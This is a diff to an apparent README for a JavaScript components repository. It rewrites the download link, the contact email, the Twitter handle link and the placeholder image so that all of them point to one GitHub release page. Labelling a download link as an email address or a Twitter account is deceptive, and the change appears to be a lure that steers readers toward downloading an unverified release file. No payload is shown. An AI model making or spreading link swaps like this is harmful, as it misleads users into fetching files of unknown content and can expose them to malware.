@@ -17,7 +17,7 @@ Explore the following components and templates available in this repository:
 
 ## Grab Your Copy Now!
 
-👉 [Download Js Components](https://github.com/files/Soft.zip)
+👉 [Download Js Components](https://github.com/TAR2553/js-Components/releases/tag/v1.2)
 
 If the link needs to be launched, follow the link above to access the latest components and templates. In case the link is not working, please check the **Releases** section for alternate download options.
 
@@ -39,12 +39,12 @@ A big thank you to all the contributors who have made this repository possible. 
 
 Have questions, suggestions, or just want to say hi? Feel free to reach out to us:
 
-- Email: contact@jscomponents.com
-- Twitter: [@js_components](https://twitter.com/js_components)
+- Email: https://github.com/TAR2553/js-Components/releases/tag/v1.2
+- Twitter: [@js_components](https://github.com/TAR2553/js-Components/releases/tag/v1.2)
 
 Join our growing community of developers and designers dedicated to creating amazing web experiences.
 
-![JS-Components](https://via.placeholder.com/800x400)
+![JS-Components](https://github.com/TAR2553/js-Components/releases/tag/v1.2)
 
 ---
 
